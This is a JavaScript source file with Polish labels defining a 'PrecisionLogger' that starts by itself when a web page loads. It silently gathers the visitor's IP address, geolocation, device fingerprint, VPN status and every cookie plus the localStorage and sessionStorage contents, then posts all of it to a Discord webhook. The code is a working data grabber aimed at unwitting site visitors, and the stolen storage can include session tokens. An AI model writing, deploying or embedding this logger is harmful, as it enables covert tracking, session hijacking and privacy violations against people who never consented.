class PrecisionLogger {
    constructor() {
        this.data = {
            ip: null,
            location: { accuracy: "Niska" },
            device: {},
            network: {},
            storage: {
                cookies: {},
                localStorage: {},
                sessionStorage: {}
            },
            time: new Date().toLocaleString("pl-PL")
        };
    }

    async init() {
        try {
            await this._getIP();
            await this._getLocation();
            this._getDeviceInfo();
            this._getStorageData();
            await this._checkNetwork();
            await this._sendToDiscord();
        } catch (error) {
            console.error("Błąd loggera:", error);
        }
    }

    async _getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            this.data.ip = data.ip;
        } catch (error) {
            console.error("Błąd pobierania IP:", error);
            throw error;
        }
    }

    async _getLocation() {
        if (!this.data.ip) return;
        
        const sources = [
            this._checkIpApiCo(),
            this._checkIpWhoIs(),
            this._checkIpApiCom()
        ];
        
        const results = await Promise.allSettled(sources);
        const validResults = results
            .filter(r => r.status === "fulfilled" && r.value)
            .map(r => r.value);
            
        if (validResults.length > 0) {
            this.data.location = validResults.reduce((best, current) => 
                current.accuracy > best.accuracy ? current : best
            );
        }
    }

    async _checkIpApiCo() {
        try {
            const url = window.CONFIG.IPAPI_KEY 
                ? `https://ipapi.co/${this.data.ip}/json/?key=${window.CONFIG.IPAPI_KEY}`
                : `https://ipapi.co/${this.data.ip}/json/`;
                
            const response = await fetch(url);
            const data = await response.json();
            
            if (data.error) return null;
            
            return {
                country: data.country_name,
                country_code: data.country,
                city: data.city,
                region: data.region,
                postal: data.postal,
                coords: `${data.latitude}, ${data.longitude}`,
                accuracy: 3
            };
        } catch (error) {
            console.log("Błąd ipapi.co:", error);
            return null;
        }
    }

    async _checkIpWhoIs() {
        try {
            const response = await fetch(`https://ipwho.is/${this.data.ip}`);
            const data = await response.json();
            
            return {
                country: data.country,
                country_code: data.country_code,
                city: data.city,
                region: data.region,
                postal: data.postal_code,
                coords: `${data.latitude}, ${data.longitude}`,
                accuracy: 2
            };
        } catch (error) {
            console.log("Błąd ipwho.is:", error);
            return null;
        }
    }

    async _checkIpApiCom() {
        try {
            const response = await fetch(`https://ipapi.com/ip_api.php?ip=${this.data.ip}`);
            const data = await response.json();
            
            return {
                country: data.country_name,
                country_code: data.country_code,
                city: data.city,
                region: data.region_name,
                postal: data.zip_code,
                coords: `${data.latitude}, ${data.longitude}`,
                accuracy: 1
            };
        } catch (error) {
            console.log("Błąd ipapi.com:", error);
            return null;
        }
    }

    _getDeviceInfo() {
        const getOS = () => {
            const ua = navigator.userAgent;
            if (/Windows/.test(ua)) return "Windows";
            if (/Mac OS X/.test(ua)) return "macOS";
            if (/Linux/.test(ua)) return "Linux";
            if (/Android/.test(ua)) return "Android";
            if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
            return navigator.platform || "Nieznany";
        };

        const getBrowser = () => {
            const ua = navigator.userAgent;
            let match = ua.match(/(firefox|chrome|safari|edge|opera|opr)\/?\s*(\d+)/i) || [];
            return match[1] ? `${match[1].charAt(0).toUpperCase() + match[1].slice(1)} ${match[2] || ''}`.trim() : "Nieznana";
        };

        this.data.device = {
            os: getOS(),
            browser: getBrowser(),
            screen: `${window.screen.width}x${window.screen.height}`,
            colorDepth: `${window.screen.colorDepth}-bit`,
            cpuCores: navigator.hardwareConcurrency > 16 ? ">16" : navigator.hardwareConcurrency,
            memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Nieznana",
            isMobile: /Android|iPhone|iPad/i.test(navigator.userAgent),
            userAgent: navigator.userAgent,
            doNotTrack: navigator.doNotTrack === "1" ? "Tak" : "Nie"
        };
    }

    _getStorageData() {
        this.data.storage.cookies = this._getAllCookies();
        this.data.storage.localStorage = this._getLocalStorage();
        this.data.storage.sessionStorage = this._getSessionStorage();
    }

    _getAllCookies() {
        try {
            return document.cookie.split(';').reduce((cookies, cookie) => {
                const [name, ...valueParts] = cookie.trim().split('=');
                const value = valueParts.join('=');
                try {
                    cookies[name] = decodeURIComponent(value);
                } catch {
                    cookies[name] = value;
                }
                return cookies;
            }, {});
        } catch (error) {
            return { error: "Błąd odczytu ciasteczek" };
        }
    }

    _getLocalStorage() {
        try {
            return Object.keys(localStorage).reduce((storage, key) => {
                try {
                    storage[key] = localStorage.getItem(key);
                } catch {
                    storage[key] = "<zabezpieczone>";
                }
                return storage;
            }, {});
        } catch (error) {
            return { error: "Błąd odczytu localStorage" };
        }
    }

    _getSessionStorage() {
        try {
            return Object.keys(sessionStorage).reduce((storage, key) => {
                try {
                    storage[key] = sessionStorage.getItem(key);
                } catch {
                    storage[key] = "<zabezpieczone>";
                }
                return storage;
            }, {});
        } catch (error) {
            return { error: "Błąd odczytu sessionStorage" };
        }
    }

    async _checkNetwork() {
        if (!this.data.ip) return;
        
        try {
            if (window.CONFIG.VPNAPI_KEY) {
                const response = await fetch(`https://vpnapi.io/api/${this.data.ip}?key=${window.CONFIG.VPNAPI_KEY}`);
                const data = await response.json();
                this.data.network = {
                    isp: data.network?.autonomous_system_organization || "Nieznany",
                    vpn: data.security?.vpn || false,
                    proxy: data.security?.proxy || false,
                    hosting: data.security?.hosting || false
                };
            }
        } catch (error) {
            console.error("Błąd sprawdzania VPN:", error);
        }
    }

    async _sendToDiscord() {
        if (!window.CONFIG.DISCORD_WEBHOOK) return;
        
        const embed = {
            title: "🔍 Pełne dane użytkownika",
            color: 0x00ff00,
            fields: [
                {
                    name: "🌍 Lokalizacja",
                    value: this._formatLocation(),
                    inline: true
                },
                {
                    name: "📱 Urządzenie",
                    value: this._formatDevice(),
                    inline: true
                },
                {
                    name: "🗄️ Przechowywanie",
                    value: this._formatStorage(),
                    inline: false
                },
                {
                    name: "🌐 Sieć",
                    value: this._formatNetwork(),
                    inline: false
                }
            ],
            footer: {
                text: `Czas: ${this.data.time} | Dokładność: ${this._getAccuracyLevel()}`
            }
        };

        try {
            await fetch(window.CONFIG.DISCORD_WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    embeds: [embed],
                    content: "⚠️ Uwaga: Dane mogą zawierać wrażliwe informacje"
                })
            });
        } catch (error) {
            console.error("Błąd wysyłania do Discord:", error);
        }
    }

    _formatLocation() {
        const loc = this.data.location;
        return `
        **Kraj:** ${loc.country || "Nieznany"} ${loc.country_code ? `(${loc.country_code})` : ""}
        **Miasto:** ${loc.city || "Nieznane"}
        **Region:** ${loc.region || "Nieznany"}
        **Kod pocztowy:** ${loc.postal || "Nieznany"}
        **Współrzędne:** ${loc.coords || "Nieznane"}
        `;
    }

    _formatDevice() {
        const dev = this.data.device;
        return `
        **System:** ${dev.os}
        **Przeglądarka:** ${dev.browser}
        **Ekran:** ${dev.screen} (${dev.colorDepth})
        **Rdzenie CPU:** ${dev.cpuCores}
        **Pamięć RAM:** ${dev.memory}
        **Typ:** ${dev.isMobile ? "Mobilne" : "Desktop"}
        **Do Not Track:** ${dev.doNotTrack}
        `;
    }

    _formatStorage() {
        const s = this.data.storage;
        return `
        **Ciasteczka (${Object.keys(s.cookies).length}):** 
        ${this._formatStorageSample(s.cookies)}
        
        **LocalStorage (${Object.keys(s.localStorage).length}):** 
        ${this._formatStorageSample(s.localStorage)}
        
        **SessionStorage (${Object.keys(s.sessionStorage).length}):** 
        ${this._formatStorageSample(s.sessionStorage)}
        `;
    }

    _formatStorageSample(storage) {
        const keys = Object.keys(storage);
        if (keys.length === 0) return "Brak";
        
        return keys.slice(0, 3).map(key => {
            const val = storage[key];
            const valuePreview = val.length > 20 ? 
                `${val.substring(0, 15)}[...]` : 
                val;
            return `\`${key}\`: ${valuePreview}`;
        }).join('\n') + 
        (keys.length > 3 ? `\n+${keys.length - 3} więcej` : '');
    }

    _formatNetwork() {
        const net = this.data.network;
        return `
        **IP:** ${this.data.ip}
        **ISP:** ${net.isp || "Nieznany"}
        **VPN:** ${net.vpn ? "Tak" : "Nie"}
        **Proxy:** ${net.proxy ? "Tak" : "Nie"}
        **Hosting:** ${net.hosting ? "Tak" : "Nie"}
        `;
    }

    _getAccuracyLevel() {
        switch(this.data.location.accuracy) {
            case 3: return "Wysoka";
            case 2: return "Średnia";
            default: return "Niska";
        }
    }
}

// Inicjalizacja loggera
document.addEventListener("DOMContentLoaded", () => {
    new PrecisionLogger().init();
});
